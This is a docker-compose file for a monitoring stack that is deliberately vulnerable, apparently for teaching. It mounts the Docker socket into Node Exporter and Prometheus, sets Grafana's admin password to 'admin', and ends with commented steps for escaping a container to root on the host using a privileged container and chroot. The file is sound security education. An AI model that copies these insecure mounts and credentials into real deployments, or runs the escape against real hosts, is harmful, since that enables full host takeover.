services:
  # VULNERABLE: Node Exporter with Docker socket access
  # 🚨 This demonstrates the WRONG way - giving monitoring tools Docker socket access
  node-exporter:
    image: prom/node-exporter:latest
    container_name: node-exporter-vulnerable

    # ✅ These mounts are legitimate and needed for monitoring
    # /proc - Process and system information
    # /sys - System device and kernel information
    # / - Root filesystem (read-only) for disk usage metrics
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro,rslave
      # 🚨 SECURITY VULNERABILITY: Docker socket mount
      # This is UNNECESSARY for monitoring but creates massive security hole
      - /var/run/docker.sock:/var/run/docker.sock

    command:
      - "--path.procfs=/host/proc"
      - "--path.sysfs=/host/sys"
      - "--path.rootfs=/rootfs"
      - "--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)"

    ports:
      - "9100:9100"

    restart: unless-stopped

    labels:
      - "purpose=system-monitoring"
      - "vulnerability=docker-socket-exposed"

  # Prometheus: Collects metrics from Node Exporter
  prometheus:
    image: prom/prometheus:latest
    container_name: prometheus-vulnerable

    command:
      - "--config.file=/etc/prometheus/prometheus.yml"
      - "--storage.tsdb.path=/prometheus"
      - "--storage.tsdb.retention.time=7d"
      - "--web.console.libraries=/etc/prometheus/console_libraries"
      - "--web.console.templates=/etc/prometheus/consoles"
      - "--web.enable-lifecycle"

    volumes:
      - ./prometheus-config:/etc/prometheus
      # 🚨 SECURITY VULNERABILITY: Docker socket mount
      # Prometheus doesn't need this but "admin convenience" adds it
      - /var/run/docker.sock:/var/run/docker.sock

    ports:
      - "9090:9090"

    depends_on:
      - node-exporter

    restart: unless-stopped

    labels:
      - "purpose=metrics-collection"
      - "vulnerability=docker-socket-exposed"

  # Grafana: Visualizes the metrics
  grafana:
    image: grafana/grafana:latest
    container_name: grafana-vulnerable

    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_USERS_ALLOW_SIGN_UP=false
      - GF_INSTALL_PLUGINS=

    ports:
      - "3000:3000"

    depends_on:
      - prometheus

    restart: unless-stopped

    labels:
      - "purpose=metrics-visualization"
# ATTACK DEMONSTRATION:
# =====================
# 1. Start containers: docker-compose -f docker-compose-vulnerable.yaml up -d
# 2. Access ANY container with Docker socket:
#    docker exec -it node-exporter-vulnerable sh
#    docker exec -it prometheus-vulnerable sh
# 3. From INSIDE any container, create privileged container:
#    docker run -it --rm --privileged --pid=host -v /:/hostfs alpine chroot /hostfs bash
# 4. You are now ROOT on the HOST SYSTEM with full filesystem access!
#
# This demonstrates that Docker socket mount = complete host compromise
# The monitoring functionality works perfectly but security is destroyed!
